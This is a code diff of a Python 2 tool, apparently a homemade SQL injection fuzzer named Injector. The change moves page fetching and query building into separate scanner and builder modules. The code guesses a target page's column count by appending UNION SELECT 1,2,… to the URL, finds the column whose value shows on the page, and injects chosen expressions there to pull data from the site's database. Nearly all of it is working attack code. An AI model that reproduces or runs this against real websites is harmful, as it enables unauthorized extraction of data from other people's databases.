@@ -6,6 +6,7 @@ from BeautifulSoup import BeautifulSoup
 import os, sys, urllib2
 import operator
 import json
+import builder, scanner
 import re
 from collections import Counter
     
@@ -16,26 +17,8 @@ class Injector:
         self.flags = flags 
         self.offset = 0 # can be changed to say, self.offset, if 1,2,3,4... found on page a lot
         self.columns_upper_limit_guess = 9
-        #self.delimiter = '%20' #Can also be '/**/'
-        self.delimiter = '/**/' #Can also be '/**/'
-
-    def get_page(self, page):
-        """ Grab page with urllib and split on whitespace.
-            :page: string representing url to be parsed
-            :throws: HTTPError.
-            :returns: list representing page's text
-        """
-        if 'http://' not in page:
-            page = 'http://' + page
-    
-        # Try to get HTML, read if successful
-        try:
-            html = urllib2.urlopen(page).read()
-            message = '\n'.join(BeautifulSoup(html).findAll(text=True))
-        except urllib2.HTTPError as e:
-            print e
-    
-        return message.split()
+        self.delimiter = '/**/' #Can also be '%20'
+        self.scan = scanner.Scanner()
     
     # Diff two html lists by turning into sets and taking difference.
     # First param should be before injection, 2nd param after.
@@ -54,13 +37,13 @@ class Injector:
     def get_num_columns(self, page):
         count = 1
     
-        original_page = self.get_page(page)
+        original_page = self.scan.page(page)
         ### Using UNION SELECT appending 1,2,... ###
         union = page + '%20UNION%20SELECT%201'
 
         ### Heuristic just looks for SELECT or empty list, needs to be MORE NUANCED!
 
-        while len(self.html_diff(original_page, self.get_page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.get_page(union)):
+        while len(self.html_diff(original_page, self.scan.page(union))) == 0 or 'SELECT' in self.html_diff(original_page, self.scan.page(union)):
             count += 1
             union += ',%20' + str(count + self.offset)
 
@@ -87,30 +70,30 @@ class Injector:
         union_urls = ['%20' + str(i + self.offset) for i in xrange(1, self.get_num_columns(page) + 1)]
         new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
 
-        diff = self.html_diff(self.get_page(page), self.get_page(new_url))
+        diff = self.html_diff(self.scan.page(page), self.scan.page(new_url))
         nums = [filter(str.isdigit, str(re.sub('<.*>','', line))) for line in diff]
         #nums.remove('')
 
         return Counter(nums).most_common(1)[0][0]
         
     
-    # Takes page to fuzz for injections and params to check for.
-    # Returns dict of lists, keys are injected strings, values are results.
     def injection(self, page, params):
+        """ Takes page to fuzz for injections and params to check for.
+            :returns: dict of lists, keys are injected strings, values are results.
+        """
+        build = builder.Builder(page, params)
         columns = self.get_num_columns(page)
-        page1 = self.get_page(page)
+        default_page = self.scan.page(page)
         data = {}
         magic_number = int(self.get_visible_param(page))
-    
-        union_urls = ['%20' + str(i + self.offset) for i in xrange(1, columns + 1)]
-        for param in params:
-            data[param] = []
-            union_urls[magic_number - 1] = '%20' + param
 
-            new_url = page.split('=')[0] + '=null' + '%20UNION%20SELECT' + ",".join(union_urls)
-            data[param] = (self.html_diff(page1, self.get_page(new_url)))
-    
+        queries = build.union(columns, magic_number)
+        # turn into decorator and pass specific build function?
+        #queries = build.schema_union(columns, magic_number)
+
+        for query in queries:
+            data[query] = (self.html_diff(default_page, self.scan.page(queries[query])))
+
         return data
     
-
     #
